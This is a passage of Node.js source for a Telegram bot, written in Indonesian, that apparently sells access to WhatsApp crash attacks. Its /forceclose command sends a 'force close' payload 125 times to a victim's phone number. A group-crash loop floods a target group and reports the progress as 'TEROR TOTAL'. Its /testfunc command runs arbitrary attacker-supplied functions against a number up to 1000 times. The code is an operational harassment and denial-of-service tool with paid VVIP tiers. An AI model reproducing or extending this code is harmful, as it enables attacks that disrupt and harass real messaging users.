      await CrashGren(sock, groupJid);
      
      const randomDelay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
      await sleep(randomDelay);

      if (i % 10 === 0 || i === total) {
        const percent = Math.floor((i / total) * 100);
        const filled = Math.floor(percent / 10);
        const progressBar = "█".repeat(filled) + "▱".repeat(10 - filled);
        const statusIcon = percent < 70 ? "⚡ MENGIRIM" : "💀 TEROR TOTAL";
        const newCaption = `✨ *GREN X CRASH GROUP* ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *Target Group* : ${inviteLink}
⚙️ *Type* : CrashXGroup
📡 *Status* : ${statusIcon}
📊 *Progress* : ${progressBar} ${percent}%
🚀 *Kiriman* : ${i}/${total}
⏱️ *Delay* : ~${Math.floor(randomDelay/1000)} detik
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        await bot.editMessageCaption(newCaption, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "🔍 LIHAT GRUP", url: inviteLink }]]
          }
        }).catch(err => console.error("Edit error:", err.message));
      }
    }

    console.log("[SUCCESS] CrashXGroup selesai!");
    await bot.editMessageCaption(`✨ *GREN X CRASH GROUP* ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *Target Group* : ${inviteLink}
⚙️ *Type* : CrashXGroup
📡 *Status* : ✅ SUKSES 🔥
📊 *Progress* : ██████████ 100%
🚀 *Kiriman* : ${total}/${total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 Total serangan berhasil dikirim!`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "🔍 LIHAT GRUP", url: inviteLink }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal: ${error.message}`);
  }
});


bot.onText(/\/forceclose(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  if (!isVVip(userId)) {
    return bot.sendMessage(chatId, `❌ *Akses Ditolak*\nCommand /forceclose hanya untuk role *VVIP*.\nHubungi owner untuk upgrade.`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  let targetNumber = match[1];
  if (!targetNumber) {
    return bot.sendMessage(chatId, "🪧 *Contoh:* `/forceclose 628123456789`", { parse_mode: "Markdown" });
  }

  const cleanNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = cleanNumber + "@s.whatsapp.net";

  try {
    if (!sessions || sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }
    if (!sock || !sock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Koneksi WhatsApp tidak valid. Silakan hubungkan ulang.");
    }

    const cooldownRemaining = await checkCooldown(userId, "forceclose");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    await bot.sendMessage(chatId, `✅ *ForClose No Click by GrenTzy* sedang dikirim ke ${cleanNumber}`, {
      parse_mode: "Markdown"
    });

    for (let i = 0; i < 125; i++) {
      await SenkuForclose(sock, target);
      console.log(`[ForCloseGren] VVIP ${username} (${userId}) menyerang ${target}`);
      await sleep(1200);
    }

    await bot.sendMessage(chatId, `🔥 *ForClose No Click* berhasil dikirim sebanyak 125 kali ke ${cleanNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "🤫 Cek Target", url: `https://wa.me/${cleanNumber}` }
        ]]
      }
    });

  } catch (error) {
    console.error("Error di /forceclose:", error.message);
    bot.sendMessage(chatId, `❌ Gagal mengirim forclose: ${error.message}`);
  }
});

// case addbot
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "HTML" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// case addprem
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

// case delprem
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu ngapain sih kontol lu bukan admin bego😤.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Command yang lu pake salah dongo noh contoh nya🤑. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Coba masukin lagi jangan jangan otak lu ngentot mulu makanya salah mulu😂.");
    }

    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

// case setjeda 
bot.onText(/\/setjeda\s+(\d+[smh]|0s|0m|0h)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const isOwnerUser = (userId === OWNER_ID) || adminUsers.includes(userId);
    if (!isOwnerUser) {
        return bot.sendMessage(chatId, "❌ Hanya owner/admin yang bisa mengatur cooldown.");
    }
    const timeString = match[1];
    const response = setCooldown(timeString);
    bot.sendMessage(chatId, response);
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

// case verip
bot.onText(/^\/verip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputToken = match[1]?.trim();

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @GrenTzy");
  }
  
  if (!inputToken) {
    return bot.sendMessage(
      chatId,
      "🔑 Format salah!\n Format : /verip <token>"
    );
  }

  try {
    const res = await axios.get(GITHUB_TOKEN_LIST_URL);
    const validTokens = res.data.tokens || [];

    if (validTokens.includes(inputToken)) {

      if (!verifiedData.tokenVerified.includes(chatId)) {
        verifiedData.tokenVerified.push(chatId);
        saveVerifiedData(verifiedData);
      }

      return bot.sendMessage(
        chatId,
        "🔓 Token berhasil diaktifkan!\nGunakan /pw <pasword> untuk lanjut"
      );

    } else {
      return bot.sendMessage(chatId, "❌ Token tidak valid!");
      setTimeout(() => process.exit(0), 1200);
    }

  } catch (err) {
    return bot.sendMessage(chatId, "⚠️ Tidak bisa mengecek token.");
    
  }
});

// case pw
bot.onText(/\/pw (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @GrenTzy");
  }
  
  if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 Kamu belum verifikasi token!\nFormat : /verip <token>"
    );
  }

  if (!GLOBAL_PASSWORD) {
    return bot.sendMessage(chatId, "⚠️ Password belum dimuat.");
  }

  if (input === GLOBAL_PASSWORD) {

    if (!verifiedData.fullyVerified.includes(chatId)) {
      verifiedData.fullyVerified.push(chatId);
      saveVerifiedData(verifiedData);
    }

    return bot.sendMessage(
      chatId,
      "🔓 Password benar!\nKetik /XGren untuk membuka menu utama."
    );

  } else {
    return bot.sendMessage(chatId, "❌ Password salah!");
  }
});

// case testfunction 
bot.onText(/^\/testfunc (.+)/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;
    const randomImage = getRandomImage();

    const replyId = msg.reply_to_message
      ? msg.reply_to_message.message_id
      : msg.message_id;

    const args = msg.text.split(" ");

    if (args.length < 3)
      return bot.sendMessage(
        chatId,
        "🪧 ☇ Format: /testfunc 62xxx 10 (reply function/file)",
        { reply_to_message_id: replyId }
      );

    if (!sessions || sessions.size === 0) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote><tg-emoji emoji-id="5350496629008917458">🚫</tg-emoji> Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx</blockquote>`,
        parse_mode: "HTML",
      });
    }

    const q = args[1];

    const jumlah = Math.max(
      0,
      Math.min(parseInt(args[2]) || 1, 1000)
    );

    if (isNaN(jumlah) || jumlah <= 0)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Jumlah harus angka",
        { reply_to_message_id: replyId }
      );

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let funcCode = "";

    if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
      }
      else if (msg.reply_to_message.document) {
        const fileName = msg.reply_to_message.document.file_name || "";
        if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
          return bot.sendMessage(
            chatId,
            "❌ ☇ File harus .js atau .txt",
            { reply_to_message_id: replyId }
          );
        }
        const fileId = msg.reply_to_message.document.file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl);
        funcCode = response.data;
      }
    }

    if (!funcCode)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Reply function text atau file .js/.txt",
        { reply_to_message_id: replyId }
      );

    const processMsg = await bot.sendPhoto(
      chatId,
      randomImage,
      {
        caption: `<blockquote>GrenTzy 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process <tg-emoji emoji-id="5352940967911517739">⏳</tg-emoji>
</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: replyId,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "GrenTzy",
                url: `https://wa.me/${formattedNumber}`,
                style: "danger"
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMsg.message_id;

    const sock = sessions.values().next().value;
    if (!sock) throw new Error("Tidak ada koneksi WhatsApp aktif");

    const matchFunc = funcCode.match(/async function\s+([a-zA-Z0-9_]+)/);
    if (!matchFunc)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Function tidak valid",
        { reply_to_message_id: replyId }
      );

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      crypto,
      sock: sock,
      target: target,
      sleep,
      generateWAMessageFromContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(sock, target);
        } else {
          await fn(sock, target, true);
        }
      } catch (err) {
        console.error(`Iterasi ${i+1} error:`, err);
      }
      await sleep(1000);
    }

    const finalText = `<blockquote>GrenTzy 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success <tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>
</blockquote>`;

    try {
      await bot.editMessageCaption(finalText, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "GrenTzy",
                url: `https://wa.me/${formattedNumber}`,
                style: "danger"
              },
            ],
          ],
        },
      });
    } catch (e) {
      await bot.sendPhoto(
        chatId,
        randomImage,
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_to_message_id: replyId,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "GrenTzy",
                  url: `https://wa.me/${formattedNumber}`,
                  style: "danger"
                },
              ],
            ],
          },
        }
      );
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(
      msg.chat.id,
      `FUNCTION LU EROR BANGKE: ${err.message}`,
      {
        reply_to_message_id: msg.message_id,
      }
    );
  }
});

// case addakun
bot.onText(/\/addakun (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return bot.sendMessage(chatId, "❌ Bego minta add dulu sama GrenTzy baru bisa pake kontol😂.");
    }
    
    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa menambahkan akun.");
    }

    const args = match[1].trim().split(/\s+/);
    if (args.length < 2) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Format salah!*\n\n" +
            "Gunakan: `/addakun <username> <password>`\n" +
            "Contoh: `/addakun johndoe rahasia123`\n\n" +
            "Ketik `/addakun` saja untuk melihat panduan lengkap.",
            { parse_mode: "Markdown" }
        );
    }

    const username = args[0];
    const password = args.slice(1).join(" ");

    if (!username || username.length === 0) {
        return bot.sendMessage(chatId, "❌ Username tidak boleh kosong.");
    }

    try {
        await addAkun(username, password);
        bot.sendMessage(chatId, `✅ Akun \`${username}\` berhasil ditambahkan.`, { parse_mode: "Markdown" });
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`);
    }
});

// case delakun
bot.onText(/\/delakun (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Hanya owner yang sudah di-add yang bisa menggunakan command ini.");
    }

    const username = match[1].trim();
    try {
        await deleteAkun(username);
        bot.sendMessage(chatId, `✅ Akun \`${username}\` berhasil dihapus.`, { parse_mode: "Markdown" });
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`);
    }
});

// case addtoken
bot.onText(/\/addtoken (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Hanya owner yang sudah di-add yang bisa menggunakan command ini.");
    }

    const newToken = match[1].trim();
    try {
        await addToken(newToken);
        bot.sendMessage(chatId, `✅ Token berhasil ditambahkan.`);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`);
    }
});

// case deltoken
bot.onText(/\/deltoken (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa menggunakan command ini.");
    }
    const tokenToRemove = match[1].trim();
    try {
        await deleteToken(tokenToRemove);
        bot.sendMessage(chatId, `✅ Token berhasil dihapus.`);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`);
    }
});

// case listakun
bot.onText(/\/listakun/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    try {
        const { content } = await getGitHubContent(github.akunPath);
        const arr = Array.isArray(content) ? content : [];
        if (arr.length === 0) return bot.sendMessage(chatId, "📭 Belum ada akun.");
        let text = "*📋 Daftar Akun:*\n";
        arr.forEach((u, i) => {
            text += `${i+1}. ${u.username} - \`${u.password}\`\n`;
        });
        bot.sendMessage(chatId, text, { parse_mode: "Markdown" }).catch(() => {
            bot.sendMessage(chatId, text.replace(/\*/g, '').replace(/`/g, ''));
        });
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal mengambil daftar akun: ${err.message}`);
    }
});

// case setpassword
bot.onText(/\/setpassword(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const password = match[1] ? match[1].trim() : null;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang sudah di-add yang bisa menggunakan command ini.");
  }

  if (!password) return bot.sendMessage(chatId, "Format: /setpassword <password>");
  passwordDB.password = password;
  savePassword(passwordDB);
  bot.sendMessage(chatId, "✅ Password disimpan.");
});

// case delpasword 
bot.onText(/\/delpassword/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan command ini.");
  }
  passwordDB.password = null;
  savePassword(passwordDB);
  bot.sendMessage(chatId, "✅ Password dihapus.");
});

// case onlygc
bot.onText(/\/onlygc(?:\s+(on|off))?/, (msg, match) => {
    const userId = msg.from.id;

    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(msg.chat.id, "❌ Hanya owner utama yang bisa menggunakan command ini.");
    }
    const option = match[1] ? match[1].toLowerCase() : null;
    if (!option || (option !== "on" && option !== "off")) {
        return bot.sendMessage(msg.chat.id, "⚙️ Format: /onlygc on | off");
    }
    onlyGroup = option === "on";
    saveGroupMode();
    bot.sendMessage(
        msg.chat.id,
        onlyGroup
            ? "✅ Mode *Only Group* aktif.\nBot hanya bisa digunakan di grup."
            : "✅ Mode *Only Group* dimatikan.\nBot bisa dipakai di grup & PM.",
        { parse_mode: "Markdown" }
    );
});


// ==================== CASE ADDOWNER ====================
bot.onText(/\/addowner(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (senderId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa menambah owner.');
    }

    let targetId = msg.reply_to_message ? msg.reply_to_message.from.id : (match[1] ? parseInt(match[1]) : null);
    if (!targetId) {
        return bot.sendMessage(chatId, '📌 Format: /addowner <user_id> atau reply pesan user');
    }

    let owners = loadOwners();
    if (owners.includes(targetId)) {
        return bot.sendMessage(chatId, `⚠️ User ${targetId} sudah menjadi owner.`);
    }

    owners.push(targetId);
    const saved = saveOwners(owners);
    
    if (saved) {
        await bot.sendMessage(chatId, `✅ User ${targetId} BERHASIL ditambahkan sebagai owner.`);
        try {
            await bot.sendMessage(targetId, '🎉 Selamat! Anda telah ditambahkan sebagai owner bot ini.');
        } catch (e) {
            console.log('Tidak bisa mengirim DM ke user baru:', e.message);
        }
    } else {
        bot.sendMessage(chatId, `✅ Hore User ${targetId} Akhirnya anak kontol berhasil di add juga🤑.`);
    }
});

// case delowner 
bot.onText(/\/delowner(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (senderId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa menghapus owner.');
    }

    let targetId = msg.reply_to_message ? msg.reply_to_message.from.id : (match[1] ? parseInt(match[1]) : null);
    if (!targetId) {
        return bot.sendMessage(chatId, '📌 Format: /delowner <user_id> atau reply pesan user');
    }

    let owners = loadOwners();
    if (!owners.includes(targetId)) {
        return bot.sendMessage(chatId, `⚠️ User ${targetId} bukan owner.`);
    }

    if (targetId === MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, '❌ Tidak bisa menghapus owner utama.');
    }

    const newOwners = owners.filter(id => id !== targetId);
    const saved = saveOwners(newOwners);
    
    if (saved) {
        bot.sendMessage(chatId, `✅ User ${targetId} BERHASIL dihapus dari daftar owner.`);
    } else {
        bot.sendMessage(chatId, `✅ Hore User ${targetId} Akhirnya anak kontol berhasil di delete juga🤑.`);
    }
});

// case cek owner 
bot.onText(/\/cekowner/, (msg) => {
    const chatId = msg.chat.id;
    const owners = loadOwners();
    
    let text = '📋 *DAFTAR OWNER BOT*\n';
    text += '━━─━─━─━─━─━─━─━\n';
    owners.forEach((id, i) => {
        const isMain = id === MAIN_OWNER_ID ? '👑 MAIN OWNER' : '🔹 Owner';
        text += `${i+1}. ${id} (${isMain})\n`;
    });
    text += '━━─━─━─━─━─━─━─━';
    
    bot.sendMessage(chatId, text, { parse_mode: 'MarkdownV2' }).catch(() => {

        bot.sendMessage(chatId, text.replace(/\*/g, '').replace(/_/g, ''));
    });
});

// case restartpanel 
bot.onText(/\/restartpanel/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa merestart panel.");
    }

    await bot.sendMessage(chatId, "⚠️ Panel akan direstart. Bot akan mati dan panel akan memulai ulang proses.");
    
    setTimeout(() => {
        console.log("🔄 Panel direstart oleh owner utama.");
        process.exit(1);
    }, 3000);
});

// case restartbot
bot.onText(/\/restartbot/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa merestart bot.");
    }

    await bot.sendMessage(chatId, "🔄 Bot akan direstart dalam 3 detik. Semua user akan mendapat notifikasi saat bot ready.");

    setTimeout(() => {
        console.log("🔄 Bot direstart oleh owner utama.");
        process.exit(0);
    }, 3000);
});

bot.on('message', (msg) => {
    if (msg.from && msg.from.id) {
        saveUser(msg.from.id);
    }
});


bot.on('message', (msg) => {
    if (msg.text && msg.text.startsWith('/') && msg.text !== '/onlygc') {
        if (onlyGroup && msg.chat.type === "private") {
            bot.sendMessage(msg.chat.id, "❌ Kontol jangan cet di bot sekarang lagi mode only group😂.");
        }
    }
});

bot.onText(/\/antrian(?:\s+(\w+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    

    if (!isAdmin) {
        return bot.sendMessage(chatId, "❌ Hanya admin grup yang bisa menggunakan perintah ini!");
    }

    const subCommand = match[1];
    if (!subCommand) {
        const status = isAntrianEnabled(chatId) ? 'AKTIF ✅' : 'NONAKTIF ❌';
        return bot.sendMessage(chatId, `⚙️ *ANTRIAN TESTFUNC*\n\nStatus: ${status}\n\nPerintah:\n/antrian on - Aktifkan antrian\n/antrian off - Matikan antrian\n\n💡 Saat aktif, perintah /testfunc akan dieksekusi berurutan (tidak bertabrakan).`, { parse_mode: 'Markdown' });
    }

    if (subCommand === 'on') {
        setAntrianEnabled(chatId, true);
        bot.sendMessage(chatId, "✅ Antrian diaktifkan untuk chat ini!\n\nSekarang perintah /testfunc akan dijalankan secara berurutan.");
    } else if (subCommand === 'off') {
        setAntrianEnabled(chatId, false);
        bot.sendMessage(chatId, "❌ Antrian dimatikan untuk chat ini.\n\nPerintah /testfunc akan berjalan langsung (rentan tabrakan).");
    } else {
        bot.sendMessage(chatId, "❌ Subcommand tidak valid! Gunakan `on` atau `off`.", { parse_mode: 'Markdown' });
    }
});

// case cekfunc
bot.onText(/\/cekfunc/, async (msg) => {
    const chatId = msg.chat.id;
    if (!msg.reply_to_message) return bot.sendMessage(chatId, "❌ Reply function JavaScript.");
    const text = msg.reply_to_message.text || msg.reply_to_message.caption;
    if (!text) return bot.sendMessage(chatId, "❌ Tidak ada kode.");
    try {
        acorn.parse(text, { ecmaVersion: "latest", sourceType: "module", locations: true });
        return bot.sendMessage(chatId, "✅ SYNTAX VALID (Gak ada error ya kontol ☠️)\n\n© @GrenTzy");
    } catch (err) {
        const lines = text.split("\n");
        const line = err.loc.line, col = err.loc.column;
        const start = Math.max(0, line-3), end = Math.min(lines.length, line+2);
        const snippet = lines.slice(start,end).map((l,i)=> (start+i+1===line ? `👉 ${start+i+1} | ${l}` : `   ${start+i+1} | ${l}`)).join("\n");
        return bot.sendMessage(chatId, `❌ ERROR\n${err.message}\nLine ${line}:${col}\n\n\`\`\`js\n${snippet}\n\`\`\``, { parse_mode: 'Markdown' });
    }
});

// case allowcmd
bot.onText(/^\/allowcmd\s+(\d+)\s+([a-zA-Z0-9]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== MAIN_OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa menggunakan command ini.");
  }

  const targetId = parseInt(match[1]);
  let command = match[2].toLowerCase();

  if (!allCommands.includes(command)) {
    return bot.sendMessage(chatId, `❌ Command ${command} tidak dikenal.`);
  }

  if (!commandWhitelist.has(targetId)) commandWhitelist.set(targetId, new Set());
  commandWhitelist.get(targetId).add(command);

  if (commandDenylist.has(targetId)) {
    commandDenylist.get(targetId).delete(command);
  }

  bot.sendMessage(chatId, `✅ Command /${command} diaktifkan (@GrenTzy) untuk user ${targetId}.`);
});


bot.onText(/\/addvvip\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menambahkan VVIP.");
  }

  const targetUserId = match[1];

  if (vvipUsers.includes(targetUserId)) {
    return bot.sendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi VVIP.`);
  }

  vvipUsers.push(targetUserId);
  saveVVip();

  bot.sendMessage(chatId, `✅ User ${targetUserId} berhasil ditambahkan sebagai VVIP.\n\nSekarang user bisa menggunakan command *forceclose*.`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/\/delvvip\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menghapus VVIP.");
  }

  const targetUserId = match[1];
  const index = vvipUsers.indexOf(targetUserId);
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${targetUserId} tidak terdaftar sebagai VVIP.`);
  }

  vvipUsers.splice(index, 1);
  saveVVip();

  bot.sendMessage(chatId, `🔒 User ${targetUserId} telah dihapus dari daftar VVIP.`);
});

bot.onText(/\/listvvip/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa melihat daftar VVIP.", { parse_mode: "Markdown" });
  }

  if (vvipUsers.length === 0) {
    return bot.sendMessage(chatId, "📋 *Daftar VVIP*\nBelum ada user VVIP.", { parse_mode: "Markdown" });
  }

  const list = vvipUsers.map((id, idx) => `${idx + 1}. ${id}`).join("\n");
  bot.sendMessage(chatId, `📋 *Daftar VVIP:*\n${list}`, { parse_mode: "Markdown" });
});

// case denycmd
bot.onText(/^\/denycmd\s+(\d+)\s+([a-zA-Z0-9]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== MAIN_OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa menggunakan command ini.");
  }

  const targetId = parseInt(match[1]);
  let command = match[2].toLowerCase();

  if (!allCommands.includes(command)) {
    return bot.sendMessage(chatId, `❌ Command ${command} tidak dikenal.`);
  }

  if (!commandDenylist.has(targetId)) commandDenylist.set(targetId, new Set());
  commandDenylist.get(targetId).add(command);

  if (commandWhitelist.has(targetId)) {
    commandWhitelist.get(targetId).delete(command);
  }

